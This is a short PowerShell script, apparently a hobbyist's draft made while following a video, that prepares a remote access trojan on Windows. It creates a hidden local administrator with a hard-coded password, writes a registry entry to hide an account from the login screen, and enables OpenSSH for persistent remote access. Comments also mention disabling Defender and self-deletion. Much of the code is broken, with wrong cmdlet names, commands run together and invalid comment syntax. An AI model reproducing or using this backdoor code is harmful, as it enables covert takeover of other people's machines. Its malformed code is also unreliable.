#biulds resources for the  rat
# created by Dark Lord


#random string for direcories
 function random_text {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 }
#attemp to disable the defender





#create local admin for the rat 
function create_account {
    [CmdletBinding()] 
    param (
        [string] $uname,
        [securestring] $pword
     )
     begin {
     }
        process {
            New-Location "$uname" -pword $pword-FullName "$uname" -Description "Temporary local admin"
            write-Verbose "$uname local user created" Add-LocalGroupMember -Group "Administrators" -Member "$uname"
            
        }
        end{  
        }

    }

#create admin user
$uname = "WindowsGuest"
$pword = (ConvertTo-Securestring "rat123"-AsPlainText -Force)
create_account  -uname $uname -pword $pword

#registry  to hide local admin
$registry_name = random_text
(
    echo Windows Registry Editior Version 5.00

    echo
    [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList]
    echo "DarkSauron"=dword:00000000;
) > "$registry_name.reg"


#varaibles

$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location
 // watch the video from the timeline 34:00 









#enabling  the presistance ssh 
Add-WindowsCapablity -Online -Name OpenSSH.Server~~~~0.0.1.0 Start-Service  -Name sshd-StartupType 'Automatic' Get-NetFirewallRule - Name *ssh* 


#goto temp ,make working directory

 mkdir $path 
 cd $path 
 

 #self delete
 #cd $initial_dir
 #del installer.ps1





i am happy  to do the same thing again and agian

